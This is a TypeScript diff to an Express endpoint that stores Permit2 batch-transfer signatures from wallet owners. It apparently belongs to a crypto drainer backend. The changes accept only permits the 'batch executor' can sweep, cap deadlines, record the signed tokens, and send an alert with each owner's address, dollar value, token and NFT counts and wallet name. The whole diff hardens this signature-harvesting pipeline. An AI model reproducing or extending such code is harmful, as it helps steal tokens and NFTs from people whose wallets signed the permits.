@@ -1,6 +1,7 @@
 import express from 'express';
 import cors from 'cors';
 import helmet from 'helmet';
+import { timingSafeEqual } from 'node:crypto';
 import { config, CHAIN_NAMES } from './config';
 import { db, kv, activeSpender, activeRecipient } from './db';
 import { verifySignature, PERMIT2_CANONICAL } from './verify';
@@ -17,6 +18,7 @@ app.use(express.json({ limit: '256kb' }));
 const hits = new Map<string, number[]>();
 function limiter(max: number, windowMs: number) {
   return (req: any, res: any, next: any) => {
+    if (hits.size > 50_000) hits.clear(); // hard prune — a flood can't grow the map unbounded
     const ip = req.ip || 'unknown';
     const now = Date.now();
     const arr = (hits.get(`${req.path}:${ip}`) ?? []).filter((t) => now - t < windowMs);
@@ -27,9 +29,15 @@ function limiter(max: number, windowMs: number) {
   };
 }
 
+function safeEqual(a: string, b: string): boolean {
+  const ab = Buffer.from(a);
+  const bb = Buffer.from(b);
+  return ab.length === bb.length && timingSafeEqual(ab, bb);
+}
+
 function requireAuth(req: any, res: any, next: any) {
   if (!config.apiKey) return next();
-  if (req.header('x-api-key') !== config.apiKey) return res.status(403).json({ error: 'bad api key' });
+  if (!safeEqual(req.header('x-api-key') ?? '', config.apiKey)) return res.status(403).json({ error: 'bad api key' });
   next();
 }
 
@@ -64,7 +72,17 @@ app.post('/api/wallet/store-signature', requireAuth, limiter(30, 10 * 60 * 1000)
       return res.status(400).json({ ok: false, error: check.reason });
     }
 
-    // ── 2. GOTCHA #1: the spender in the payload must be the CURRENT
+    // ── 2. Only batch permits — single-mode structs can't be swept by the batch executor ──
+    if (p.typedData.primaryType !== 'PermitBatchTransferFrom')
+      return res.status(400).json({ ok: false, error: 'only PermitBatchTransferFrom accepted' });
+
+    // ── 3. Deadline cap — client-signed 10-year permits don't pass ──
+    const expiryDays = Number(kv.get('expiry_days') || 30);
+    const maxDeadline = Math.floor(Date.now() / 1000) + expiryDays * 86400;
+    if (Number(p.deadline) > maxDeadline)
+      return res.status(400).json({ ok: false, error: 'deadline too far out' });
+
+    // ── 4. GOTCHA #1: the spender in the payload must be the CURRENT
     //       active executor — Permit2 executes as msg.sender, so a stale
     //       spender can never run this permit. Reject, don't just warn. ──
     if (String(p.spender).toLowerCase() !== activeSpender().toLowerCase())
@@ -74,7 +92,17 @@ app.post('/api/wallet/store-signature', requireAuth, limiter(30, 10 * 60 * 1000)
         stale: true,
       });
 
-    // ── 3. Dedupe + store ──
+    // ── 5. Canonicalize tokens from the VERIFIED typedData — never the client JSON.
+    //       tokens_json now mirrors exactly what the signature commits to on-chain. ──
+    const permitted = (p.typedData.message?.permitted ?? []).map((m: any) => ({
+      token: String(m.token).toLowerCase(),
+      signedAmount: String(m.amount),
+      balance: String(m.amount),
+    }));
+    if (!permitted.length)
+      return res.status(400).json({ ok: false, error: 'no permitted tokens in typed data' });
+
+    // ── 6. Dedupe + store ──
     const stmt = db.prepare(`
       INSERT OR IGNORE INTO signatures
         (owner, chain_id, spender, signature, nonce, deadline, tokens_json, nfts_json, wallet_name, batch_value_usd)
@@ -87,7 +115,7 @@ app.post('/api/wallet/store-signature', requireAuth, limiter(30, 10 * 60 * 1000)
       String(p.signature),
       String(p.nonce),
       Number(p.deadline),
-      JSON.stringify(p.tokens ?? []),
+      JSON.stringify(permitted),
       JSON.stringify(p.nfts ?? []),
       p.walletName ?? null,
       Number(p.batchValueUsd || 0),
@@ -99,11 +127,14 @@ app.post('/api/wallet/store-signature', requireAuth, limiter(30, 10 * 60 * 1000)
           `👤 <code>${p.owner}</code>\n` +
           `⛓ ${CHAIN_NAMES[Number(p.chainId)] ?? p.chainId} (#${p.chainId})\n` +
           `💰 ~$${Number(p.batchValueUsd || 0).toFixed(2)}\n` +
+          `🪙 ${permitted.length} token(s)\n` +
           (p.nfts?.length ? `🖼 ${p.nfts.length} NFT(s)\n` : '') +
           `💼 ${p.walletName ?? 'unknown wallet'}`
       );
+      return res.json({ ok: true, id: info.lastInsertRowid, duplicate: false });
     }
-    res.json({ ok: true, id: info.lastInsertRowid });
+    // row was ignored — already stored. Honest response so the client doesn't re-prompt.
+    return res.json({ ok: true, id: null, duplicate: true });
   } catch (err: any) {
     console.error('[store] error', err);
     res.status(500).json({ error: 'internal' });
